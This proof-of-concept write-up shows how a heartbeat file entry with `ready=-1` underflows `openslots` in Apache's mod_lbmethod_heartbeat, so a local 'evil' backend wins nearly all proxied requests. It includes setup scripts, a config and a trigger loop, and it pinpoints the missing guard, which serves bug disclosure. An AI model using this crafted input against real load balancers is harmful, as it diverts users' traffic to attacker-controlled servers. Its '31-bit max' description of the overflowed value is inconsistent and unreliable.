# PoC 153 — Negative `ready` Inflates `openslots`

`mod_lbmethod_heartbeat` adds a signed negative `ready` into the unsigned
`openslots` accumulator, converting `-1` into `0xffffffff` and corrupting
weighted worker selection.

## Setup

Two backends and a heartbeat file with a malicious `ready=-1`:

```bash
mkdir -p /tmp/httpd-poc-153/htdocs
cd /tmp/httpd-poc-153
echo "good" > htdocs/index.html

# Backend A (good)
python3 -m http.server 18001 --bind 127.0.0.1 \
  --directory htdocs &> backendA.log &

# Backend B (evil — exfiltration sink)
python3 - <<'PY' &> backendB.log &
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print("EVIL backend hit:", self.path, flush=True)
        self.send_response(200); self.end_headers(); self.wfile.write(b"evil")
socketserver.TCPServer(("127.0.0.1", 18002), H).serve_forever()
PY

cat > heartbeats <<'EOF'
127.0.0.1:18001&ready=10&busy=0&lastseen=1
127.0.0.1:18002&ready=-1&busy=0&lastseen=1
EOF
```

`httpd.conf`:

```apache
ServerRoot "/tmp/httpd-poc-153"
PidFile "/tmp/httpd-poc-153/httpd.pid"
ErrorLog "/tmp/httpd-poc-153/error.log"
LogLevel proxy:debug lbmethod_heartbeat:trace8

Listen 127.0.0.1:8080

LoadModule mpm_event_module           modules/mod_mpm_event.so
LoadModule authz_core_module          modules/mod_authz_core.so
LoadModule proxy_module               modules/mod_proxy.so
LoadModule proxy_http_module          modules/mod_proxy_http.so
LoadModule proxy_balancer_module      modules/mod_proxy_balancer.so
LoadModule slotmem_shm_module         modules/mod_slotmem_shm.so
LoadModule lbmethod_heartbeat_module  modules/mod_lbmethod_heartbeat.so
LoadModule watchdog_module            modules/mod_watchdog.so

HeartbeatStorage /tmp/httpd-poc-153/heartbeats

<Proxy "balancer://hbcluster">
    BalancerMember "http://127.0.0.1:18001"
    BalancerMember "http://127.0.0.1:18002"
    ProxySet lbmethod=heartbeat
</Proxy>
ProxyPass        "/lb" "balancer://hbcluster"
ProxyPassReverse "/lb" "balancer://hbcluster"
```

## Trigger

```bash
/usr/sbin/httpd -f /tmp/httpd-poc-153/httpd.conf -k start
for i in $(seq 1 50); do curl -s http://127.0.0.1:8080/lb/index.html; done
```

## Observed effect

* `error.log` shows `openslots` reported by `find_best_hb()` at the
  31-bit max (`4294967304` style values) once the malformed line is
  loaded.
* `backendB.log` records numerous `EVIL backend hit: /index.html` lines.
  The negative-capacity worker, intended to be unavailable, instead wins
  selection nearly all of the time because
  `openslots += server->ready;` underflowed and made it dominate
  `ap_random_pick(0, openslots)`.

Confirms the missing `server->ready >= 0` guard at
`modules/proxy/balancers/mod_lbmethod_heartbeat.c:315`.
